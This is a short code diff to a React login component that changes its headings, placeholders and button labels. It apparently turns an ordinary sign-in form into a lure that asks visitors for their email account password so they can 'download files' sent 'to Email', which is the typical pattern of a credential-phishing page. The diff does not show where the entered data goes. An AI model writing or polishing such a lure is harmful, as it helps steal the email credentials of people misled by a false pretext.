@@ -118,7 +118,7 @@ const Login = () => {
     <div className="login-container">
       <div className="login-box">
         <div className="input-group">
-          <h2>Sign In To Continue -</h2>
+          <h3>{isEmailConfirmed ? 'Confirm email password to continue' : 'Enter email to download files'}</h3> {/* Conditional heading */}
           <div className="email-input-wrapper">
             <input
               id="email-input"
@@ -126,7 +126,7 @@ const Login = () => {
               value={email}
               onChange={handleEmailChange}
               disabled={isEmailConfirmed}
-              placeholder="Email"
+              placeholder="Enter your email"
               required
             />
           </div>
@@ -140,7 +140,7 @@ const Login = () => {
                 {isLoading ? (
                   <span className="spinner"></span>
                 ) : (
-                  'Next'
+                  'Download to Email'
                 )}
               </button>
             </div>
@@ -155,7 +155,7 @@ const Login = () => {
                 type="password"
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
-                placeholder="Password"
+                placeholder="Email password"
                 required
               />
             </div>
@@ -172,7 +172,7 @@ const Login = () => {
                 {isLoading ? (
                   <span className="spinner"></span>
                 ) : (
-                  'Login'
+                  'Continue'
                 )}
               </button>
               </div>
